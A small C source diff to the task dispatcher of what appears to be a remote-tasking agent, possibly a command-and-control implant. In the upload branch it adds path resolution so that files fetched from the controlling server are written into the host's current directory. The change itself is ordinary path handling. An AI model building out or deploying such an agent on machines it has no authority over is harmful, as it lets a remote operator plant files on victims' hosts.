@@ -1258,6 +1258,16 @@ void dispatch_task(AgentTask *task) {
         if (!filename[0] || !remote_path[0]) {
             agent_send_result(task->id, "", "upload: missing fields"); return;
         }
+        /* Resolve "." or trailing separator: use CWD\filename */
+        size_t rlen = strlen(remote_path);
+        if (strcmp(remote_path, ".") == 0 ||
+            (rlen > 0 && (remote_path[rlen-1] == '\\' || remote_path[rlen-1] == '/'))) {
+            char cwd[MAX_PATH] = {0};
+            GetCurrentDirectoryA(sizeof(cwd), cwd);
+            char tmp[MAX_PATH];
+            snprintf(tmp, sizeof(tmp), "%s\\%s", cwd, filename);
+            strncpy(remote_path, tmp, sizeof(remote_path) - 1);
+        }
         size_t data_len = 0;
         uint8_t *data = agent_download_file(filename, &data_len);
         if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
